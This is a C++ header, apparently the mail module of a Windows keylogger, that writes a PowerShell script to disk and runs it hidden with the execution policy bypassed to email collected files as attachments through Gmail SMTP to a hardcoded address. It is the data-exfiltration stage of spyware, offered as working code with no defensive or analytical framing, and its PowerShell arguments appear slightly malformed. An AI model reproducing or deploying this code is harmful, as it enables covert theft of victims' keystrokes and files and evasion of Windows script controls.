#ifndef MAIL_H
#define MAIL_H

#include <fstream>
#include <vector>
#include "windows.h"
#include "IO.h"
#include "Timer.h"
#include "Helper.h"
#include "Mail.h"

using namespace std;

#define SCRIPT_NAME "sendemail.ps1"

namespace Mail {
	
	// email credentials (SMTP)
	
    #define X_EM_TO "cryptdels@gmail.com"
    #define X_EM_FROM "cryptdels@gmail.com"
	#define X_EM_PASS "[sender email password]"
	
	// PowerShell Script into C++ String convertion
	const string &PowerShellScript =
		"Param( \r\n   [String]$Att,\r\n   [String]$Subj,\r\n   "
		"[String]$Body\r\n)\r\n\r\nFunction Send-EMail"
		" {\r\n    Param (\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$To,\r\n         [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$From,\r\n        [Parameter(`\r\n            mandatory=$true)]\r\n        "
		"[String]$Password,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Subject,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$Body,\r\n        [Parameter(`\r\n            Mandatory=$true)]\r\n        "
		"[String]$attachment\r\n    )\r\n    try\r\n        {\r\n            $Msg = New-Object "
		"System.Net.Mail.MailMessage($From, $To, $Subject, $Body)\r\n            $Srv = \"smtp.gmail.com\" "
		"\r\n            if ($attachment -ne $null) {\r\n                try\r\n                    {\r\n"
		"                        $Attachments = $attachment -split (\"\\:\\:\");\r\n                      "
		"  ForEach ($val in $Attachments)\r\n                    "
		"        {\r\n               "
		"                 $attch = New-Object System.Net.Mail.Attachment($val)\r\n                       "
		"         $Msg.Attachments.Add($attch)\r\n                            }\r\n                    "
		"}\r\n                catch\r\n                    {\r\n                        exit 2; "
		"\r\n                    }\r\n            }\r\n "
		"           $Client = New-Object Net.Mail.SmtpClient($Srv, 587) #587 port for smtp.gmail.com SSL\r\n "
		"           $Client.EnableSsl = $true \r\n            $Client.Credentials = New-Object "
		"System.Net.NetworkCredential($From.Split(\"@\")[0], $Password); \r\n            $Client.Send($Msg)\r\n "
		"           Remove-Variable -Name Client\r\n            Remove-Variable -Name Password\r\n            "
		"exit 7; \r\n          }\r\n      catch\r\n          {\r\n            exit 3; "
		"  \r\n          }\r\n} #End Function Send-EMail\r\ntry\r\n    {\r\n        "
		"Send-EMail -attachment $Att "
		"-To \"" +
		 string (X_EM_TO) +
		 "\""
		" -Body $Body -Subject $Subj "
		"-password \"" +
		 string (X_EM_PASS) +
		  "\""
		" -From \"" +
		 string (X_EM_FROM) +
		"\"""\r\n    }\r\ncatch\r\n    {\r\n        exit 4; \r\n    }";

	#undef X_EM_FROM
	#undef X_EM_TO
	#undef X_EM_PASS
	
	// functions
	string StringReplace(string s, const string &what, const string &with) {
		if(what.empty()) {
			return s;
		}
		size_t sp = 0; // string position
		// looping while conditioning
		while((sp = s.find(what,sp)) != string::npos) {
			s.replace(sp, what.length(), with), sp += with.length();
		}
		return s;
	}
	// checking if file exists
	bool CheckFileExists(const string &f) {
		ifstream file(f);
		return (bool) file;
	}
	
	// creating script
	bool CreateScript() {
		ofstream script(IO::GetPath(true) + string(SCRIPT_NAME));
		if(!script) {
			return false;
		}
		script << PowerShellScript;
		if(!script) {
			return false;
		}
		script.close();
		return true;
	}
	
	// global variable
	Timer m_timer;
	
	int SendMail(const string &subject, const string &body, const string &attachments) {
		bool ok;
		ok = IO::MKDir(IO::GetPath(true)); // getting file
		if(!ok) {
			return -1; // not be able to create a directory
		}
		// getting script
		string scr_path = IO::GetPath(true) + string(SCRIPT_NAME);
		// check existance
		if(!CheckFileExists(scr_path)) {
			ok = CreateScript();
		}
		if(!ok) {
			return -2;
		}
		
		//powershell flag
		string param = "-ExecutionPolicy ByPass -File \"" + scr_path + "\" - Subj \""
					+ StringReplace(subject, "\"", "\\\"") + "\" - Body \"" 
					+ StringReplace(body, "\"", "\\\"") + "\" - Att \"" + attachments + "\"";
		
		SHELLEXECUTEINFO ShExecInfo = {0};
		ShExecInfo.cbSize = sizeof(SHELLEXECUTEINFO); // getting process size
		ShExecInfo.fMask = SEE_MASK_NOCLOSEPROCESS; 	// prevent to terminate inmediately
		ShExecInfo.hwnd = NULL; // parent window
		ShExecInfo.lpVerb = "open"; // open Script
		ShExecInfo.lpFile = "powershell"; // script program
		ShExecInfo.lpParameters = param.c_str(); // string casted parametrs
		ShExecInfo.lpDirectory = NULL; // Working Directory
		ShExecInfo.nShow = SW_HIDE; // hiding appearance
		ShExecInfo.hInstApp = NULL;
		
		ok = (bool)ShellExecuteEx(&ShExecInfo);
		if(!ok) {
			return -3; // Script cannot be executed
		}
		
		// forcing waiting process
		WaitForSingleObject(ShExecInfo.hProcess, 7000);
		DWORD exit_code = 100; // Windows API
		GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
		// anon function for getting variables from sendEmail function
		m_timer.SetFunction([&] () {
			// waiting the response for a minute
			WaitForSingleObject(ShExecInfo.hProcess, 60000);	
			GetExitCodeProcess(ShExecInfo.hProcess, &exit_code);
			if((int) exit_code == STILL_ACTIVE) {
				// 259 => exit_code still Active (WINDOWS THING)
				TerminateProcess(ShExecInfo.hProcess, 100);
			}
			// writing log
			Helper::WriteAppLog("<From SendMail> Return code: " + Helper::ToString((int) exit_code));			
		});	
		
		m_timer.RepeatCount(1L);
		m_timer.setInterval(10L);
		m_timer.Start(true);
		return (int) exit_code;
	}

	// send multiple attachments - overloading function sendEmail
	int SendMail(const string &subject, const string &body, const vector<string> &att) {
		string attachments = "";
		if(att.size() == 1U) {
			attachments = att.at(0);
		} else {
			for(const auto &v : att) {
				attachments += v + "::";
			}
			attachments = attachments.substr(0, attachments.length() - 2);	
		}
		
		return SendMail(subject, body, attachments);
	}
}

#endif
